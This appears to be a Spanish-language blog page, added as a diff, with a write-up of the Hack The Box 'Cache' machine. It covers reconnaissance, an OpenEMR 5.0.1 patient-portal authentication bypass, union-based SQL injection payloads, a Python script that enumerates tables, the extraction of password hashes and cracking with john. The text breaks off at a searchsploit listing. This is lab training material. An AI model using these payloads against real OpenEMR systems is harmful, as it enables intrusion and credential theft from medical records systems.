@@ -1,0 +1,1137 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box Cache - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina Cache en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box Cache">
+<meta property="og:url" content="http://localhost:4000/htb-cache/">
+
+
+  <meta property="og:description" content="Resolución de la máquina Cache en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-cache/cache.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2022-03-12T00:00:00-06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-cache/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Artículos</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categorías</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Etiquetas</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/buscador/">Buscador</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">Contacto</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box Cache</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Intelligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box Cache">
+    <meta itemprop="description" content="Resolución de la máquina Cache en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="March 12, 2022">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Cache
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-03-12T00:00:00-06:00">March 12, 2022 </time> 
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-cache/banner-cache.jpg" alt=""></p>
+
+<h2 id="cache">Cache</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.188.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.188
+PING 10.10.10.188 <span class="o">(</span>10.10.10.188<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.188: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>132 ms
+
+<span class="nt">---</span> 10.10.10.188 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 132.404/132.404/132.404/0.000 ms
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.188 <span class="nt">-oG</span> allPorts
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-02-28 13:56 CST
+Initiating Ping Scan at 13:56
+Scanning 10.10.10.188 <span class="o">[</span>4 ports]
+Completed Ping Scan at 13:56, 0.15s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+Initiating SYN Stealth Scan at 13:56
+Scanning 10.10.10.188 <span class="o">[</span>65535 ports]
+Discovered open port 80/tcp on 10.10.10.188
+Discovered open port 22/tcp on 10.10.10.188
+Completed SYN Stealth Scan at 13:56, 35.69s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.188
+Host is up <span class="o">(</span>0.13s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>36.00 seconds
+           Raw packets sent: 68299 <span class="o">(</span>3.005MB<span class="o">)</span> | Rcvd: 68296 <span class="o">(</span>2.732MB<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬─────────────────────────────────────
+       │ File: extractPorts.tmp
+       │ Size: 117 B
+───────┼─────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.188
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 22,80
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.10.188 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-02-28 13:58 CST
+Nmap scan report <span class="k">for </span>10.10.10.188
+Host is up <span class="o">(</span>0.13s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Cache
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>11.60 seconds
+</code></pre></div></div>
+
+<p>Tenemos el puerto 80 abierto, por lo tanto, antes de ver el contenido vía web, vamos a ver a lo que nos enfrentamos con la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.188/
+http://10.10.10.188/ <span class="o">[</span>200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.188], Script, Title[Cache]
+</code></pre></div></div>
+
+<p>No vemos nada interesante, así que ahora si veamos el contenido con nuestro navegador.</p>
+
+<p><img src="/assets/images/htb-cache/cache-web.png" alt=""></p>
+
+<p>Aquí el sitio ya nos da una pista, ya que el texto en <strong><em>marquee</em></strong> nos hace la referencia a <strong><em>Virtual hosting</em></strong>; por lo tanto, en nuestro archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> agregamos dicho dominio y probamos a ver el contenido nuevamente. Para este caso no vemos nada interesante, así que investigando un poco el sitio web, en la parte de <code class="language-plaintext highlighter-rouge">author.html</code>, tenemos lo siguiente:</p>
+
+<p><img src="/assets/images/htb-cache/cache-web1.png" alt=""></p>
+
+<p>Nos indica que existen otros proyectos como el <strong>HMS (Hospital Management System)</strong>; por lo que podríamos probar a meter el dominio <strong>hms.htb</strong> a nuestro archivo host y ver que pasa si accedemos a este.</p>
+
+<p><img src="/assets/images/htb-cache/cache-web2.png" alt=""></p>
+
+<p>Hemos ingresado al panel de login de <strong>OpenEMR</strong> y si buscamos credenciales default tenemos <strong>admin:pass</strong>; sin embargo no jalan. Así que vamos a pensar que necesitamos encontrar credenciales válidas de acceso antes de tirar por otro lado; así que vamos a hacer <strong><em>fuzzing</em></strong> del dominio principal para empezar <strong>cache.htb</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-t</span> 200 <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hw</span><span class="o">=</span>973 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://cache.htb/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://cache.htb/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================
+
+000001073:   301        9 L      28 W       311 Ch      "javascript"                                                    
+000065593:   301        9 L      28 W       307 Ch      "jquery"                                                        
+000095524:   403        9 L      28 W       274 Ch      "server-status"                                                 
+
+Total time: 299.9204
+Processed Requests: 220560
+Filtered Requests: 220557
+Requests/sec.: 735.3950
+</span></code></pre></div></div>
+
+<p>Validando los recursos vía web, obsevamos una credenciales <strong>ash:H@v3_fun</strong> y como siempre vamos a guardarlas para no olvidarlas.</p>
+
+<p><img src="/assets/images/htb-cache/cache-web3.png" alt=""></p>
+
+<p>Si recordamos, el sitio web tiene un panel de login, por lo que podríamos probar a ver si tenemos suerte.</p>
+
+<p><img src="/assets/images/htb-cache/cache-web4.png" alt=""></p>
+
+<p>Podriamos pensar en esteganografía, pero no hay nada; sin embargo, vamos a mantener las credenciales por si el usuario existe a nivel de sistema.</p>
+
+<p>Buscando vulnerabilidades para <strong>OpenEMR</strong>, nos encontramos con el recurso <a href="https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf">open-emr</a>, en especial con la parte <strong>2.0 - Patient Portal Authentication Bypass</strong>, en donde nos dice que debe de existir un <strong>Patient Portal Login</strong>; por lo tanto, vamos a realizar un <strong><em>fuzzing</em></strong> para tratar de descubrir el directorio.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">--script</span> http-enum <span class="nt">-p80</span> hms.htb
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-12 18:29 CST
+Nmap scan report <span class="k">for </span>hms.htb <span class="o">(</span>10.10.10.188<span class="o">)</span>
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+rDNS record <span class="k">for </span>10.10.10.188: cache.htb
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|   /admin.php: Possible admin folder
+|   /common/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.29 (ubuntu)'</span>
+|   /config/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.29 (ubuntu)'</span>
+|   /custom/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.29 (ubuntu)'</span>
+|   /images/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.29 (ubuntu)'</span>
+|   /library/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.29 (ubuntu)'</span>
+|   /modules/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.29 (ubuntu)'</span>
+|   /portal/: Potentially interesting folder
+|   /public/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.29 (ubuntu)'</span>
+|   /services/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.29 (ubuntu)'</span>
+|   /sites/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.29 (ubuntu)'</span>
+|   /sql/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.29 (ubuntu)'</span>
+|   /templates/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.29 (ubuntu)'</span>
+|   /tests/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.29 (ubuntu)'</span>
+|_  /vendor/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.29 (ubuntu)'</span>
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>13.17 seconds
+</code></pre></div></div>
+
+<p>Aquí el que ya nos debería llamar la atención sería <code class="language-plaintext highlighter-rouge">/portal/</code>, por lo tanto, vamos a hacer otra vez <strong><em>fuzzing</em></strong> sobre este recurso.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">--script</span> http-enum <span class="nt">--script-args</span> http-enum.basepath<span class="o">=</span><span class="s2">"portal/"</span> <span class="nt">-p80</span> hms.htb
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-12 18:35 CST
+Nmap scan report <span class="k">for </span>hms.htb <span class="o">(</span>10.10.10.188<span class="o">)</span>
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+rDNS record <span class="k">for </span>10.10.10.188: cache.htb
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|   /portal/account/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.29 (ubuntu)'</span>
+|   /portal/images/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.29 (ubuntu)'</span>
+|   /portal/lib/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.29 (ubuntu)'</span>
+|   /portal/messaging/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.29 (ubuntu)'</span>
+|_  /portal/report/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.29 (ubuntu)'</span>
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>13.41 seconds
+</code></pre></div></div>
+
+<p>Uno recurso que ya nos llama la atención sería <code class="language-plaintext highlighter-rouge">/portal/account/</code>. Vamos a validar.</p>
+
+<p><img src="/assets/images/htb-cache/cache-web5.png" alt=""></p>
+
+<p>De acuerdo con lo que nos indica el documento, podríamos acceder a los recursos que nos indica, como por ejemplo <code class="language-plaintext highlighter-rouge">add_edit_event_user.php</code> bajo la ruta <code class="language-plaintext highlighter-rouge">/portal/</code>; así que vamos a checar.</p>
+
+<p><img src="/assets/images/htb-cache/cache-web6.png" alt=""></p>
+
+<p>Nos aplica un <strong><em>redirect</em></strong> hacia <code class="language-plaintext highlighter-rouge">http://hms.htb/portal/index.php?site=&amp;w</code>. Con base al documento, nos dice que para hacer un bypass de este panel de login/registro, tenemos que ir a <code class="language-plaintext highlighter-rouge">/portal/account/</code> y seleccionar el archivo <code class="language-plaintext highlighter-rouge">register.php</code>, posteriormente tratar de visualizar otro recurso de los que nos indica y conseguimos que no nos aplique un <strong><em>redirect</em></strong> hacia el panel de login.</p>
+
+<p><img src="/assets/images/htb-cache/cache-web7.png" alt=""></p>
+
+<p>Podemos acceder a recursos para los cuales necesitaríamos habernos logueado pero sin la necesidad de hacerlo. Continuando leyendo el documento, nos indica que podemos realizar inyecciones SQL para el recurso <code class="language-plaintext highlighter-rouge">add_edit_event_user.php</code> debido a una inadecuada configuración del parámetro <code class="language-plaintext highlighter-rouge">eid</code>; por lo tanto, vamos a probar lo siguiente:</p>
+
+<ul>
+  <li>
+<code class="language-plaintext highlighter-rouge">http://hms.htb/portal/add_edit_event_user.php?eid=1 order by 100-- -</code> Nos manda un error de la base de datos, esto es porque no existen 100 columnas.</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">http://hms.htb/portal/add_edit_event_user.php?eid=1 order by 4-- -</code> Vemos otra respuesta de acuerdo con la anterior, por lo tanto, podríamos suponer que se tienen 4 columnas.</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">http://hms.htb/portal/add_edit_event_user.php?eid=1 union select 1,2,3,4-- -</code> No vemos los campos 1,2,3 y 4; por lo que vamos a tratar de adivinar en que posiciión podríamos observar algo. Si seguimos probando, no vemos nada.</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">http://hms.htb/portal/add_edit_event_user.php?eid=1 union select null,null,database(),null-- -</code> Reemplazamos los números por el valor <code class="language-plaintext highlighter-rouge">null</code> y vemos que en el campo 3 tenemos resultados y el nombre de la base de datos actualmente en uso es <strong>openemr</strong>.</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">http://hms.htb/portal/add_edit_event_user.php?eid=1 union select null,null,(select table_name from information_schema.tables where table_schema="openemr" limit 0,1),null-- -</code> Empezamos a listar los nombre de las tablas dentro de la base de datos <strong>openemr</strong> y nos desplazamos por ellas con los valores de <code class="language-plaintext highlighter-rouge">limit</code>. Para no llevarnos una eternidad enumerando las tablas, vamos a crearnos un script en python que nos ayude a visualizar las tablas.</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+#coding:utf-8
+</span>
+<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span><span class="n">requests</span><span class="p">,</span><span class="n">signal</span><span class="p">,</span><span class="n">re</span>
+
+<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span><span class="n">frame</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[*] Saliendo..."</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span><span class="n">def_handler</span><span class="p">)</span>
+
+<span class="n">url_register</span> <span class="o">=</span> <span class="s">"http://hms.htb/portal/account/register.php"</span>
+<span class="n">url_sqli</span> <span class="o">=</span> <span class="s">"http://hms.htb/portal/add_edit_event_user.php"</span>
+
+<span class="k">def</span> <span class="nf">makeRequest</span><span class="p">(</span><span class="n">numeroTablas</span><span class="p">):</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url_register</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">int</span><span class="p">(</span><span class="n">numeroTablas</span><span class="p">)):</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="n">url_sqli</span> <span class="o">+</span> <span class="s">'?eid=1 union select null,null,(select table_name from information_schema.tables where table_schema="openemr" limit {},1),null-- -'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">r</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+            <span class="n">tableName</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r'Unknown column (\'.*?\')'</span><span class="p">,</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"'"</span><span class="p">,</span><span class="s">""</span><span class="p">)</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="n">tableName</span><span class="o">=</span><span class="s">""</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Tabla No {}: {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">tableName</span><span class="p">))</span>
+
+<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">numeroTablas</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"El número de tablas a ver: "</span><span class="p">)</span>
+    <span class="n">makeRequest</span><span class="p">(</span><span class="n">numeroTablas</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 sqli_cache.py
+El número de tablas a ver: 250
+Tabla No 0: addresses
+Tabla No 1: amc_misc_data
+Tabla No 2: amendments
+Tabla No 3: amendments_history
+Tabla No 4: ar_activity
+Tabla No 5: ar_session
+Tabla No 6: array
+Tabla No 7: audit_details
+Tabla No 8: audit_master
+Tabla No 9: automatic_notification
+Tabla No 10: background_services
+<span class="nt">---</span>
+Tabla No 220: template_users
+Tabla No 221: therapy_groups
+Tabla No 222: therapy_groups_counselors
+Tabla No 223: therapy_groups_participant_attendance
+Tabla No 224: therapy_groups_participants
+Tabla No 225: transactions
+Tabla No 226: user_settings
+Tabla No 227: <span class="nb">users
+</span>Tabla No 228: users_facility
+Tabla No 229: users_secure
+Tabla No 230: valueset
+Tabla No 231: version
+Tabla No 232: voids
+Tabla No 233: x12_partners
+<span class="nt">---</span>
+Tabla No 248: 
+Tabla No 249:
+</code></pre></div></div>
+
+<p>Tenemos tablas que nos pueden llamar la atención, como <strong>users</strong> y <strong>users_secure</strong>.</p>
+<ul>
+  <li>
+<code class="language-plaintext highlighter-rouge">http://hms.htb/portal/add_edit_event_user.php?eid=1 union select null,null,(select column_name from information_schema.columns where table_name="users_secure" and table_schema="openemr" limit 0,1),null-- -</code> Vemos que no le gusta al servidor, por lo que vamos a cambiar un poco la expresión.</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">http://hms.htb/portal/add_edit_event_user.php?eid=1 union select null,null,(select column_type from information_schema.columns where table_name="users_secure" and table_schema="openemr" limit 0,1),null-- -</code> Vemos que si nos acepta el tipo de dato de la columna, que para este caso es <code class="language-plaintext highlighter-rouge">bigint(20)</code>.</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">http://hms.htb/portal/add_edit_event_user.php?eid=1 union select null,null,(select concat(column_name,0x3a,column_type) from information_schema.columns where table_name="users_secure" and table_schema="openemr" limit 0,1),null-- -</code> Ahora podemos ver el nombre de la columna con el tipo de la misma separadas por dos puntos.
+    <ul>
+      <li>id</li>
+      <li>username</li>
+      <li>password</li>
+      <li>salt</li>
+      <li>last_update</li>
+      <li>password_history1</li>
+      <li>salt_history1</li>
+      <li>password_history2</li>
+      <li>salt_history2</li>
+    </ul>
+  </li>
+  <li>
+<code class="language-plaintext highlighter-rouge">http://hms.htb/portal/add_edit_event_user.php?eid=1 union select null,null,(select concat(username,0x3a,password,0x3a,salt) from users_secure limit 0,1),null-- -</code> Obtenemos los datos de la tabla en el formato <strong>username:password:salt</strong>.</li>
+</ul>
+
+<p>Con esto, tenemos el usuairo <strong>openemr_admin</strong> y un hash, el cual vamos a tratar de romper con <code class="language-plaintext highlighter-rouge">john</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>bcrypt <span class="o">[</span>Blowfish 32/64 X3]<span class="o">)</span>
+Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 32 <span class="k">for </span>all loaded hashes
+Will run 8 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+xxxxxx           <span class="o">(</span>openemr_admin<span class="o">)</span>
+1g 0:00:00:00 DONE <span class="o">(</span>2022-03-12 20:27<span class="o">)</span> 6.250g/s 5400p/s 5400c/s 5400C/s caitlin..felipe
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<p>Ya tenemos unas credenciales <strong>openemr_admin : xxxxxx</strong>, por lo que vamos a validarlas en el panel de login de <strong>openEMR</strong>.</p>
+
+<p><img src="/assets/images/htb-cache/cache-web8.png" alt=""></p>
+
+<p>Ya ingresamos al panel de administración de <strong>openEMR</strong>. En el campo <strong>About</strong> vemos que nos enfrentamos a un <strong>OpenEMR v5.0.1 (3)</strong>, así que vamos a buscar posibles exploits que nos ayuden a ingresar al sistema.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit openemr 5.0.1
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                 |  Path
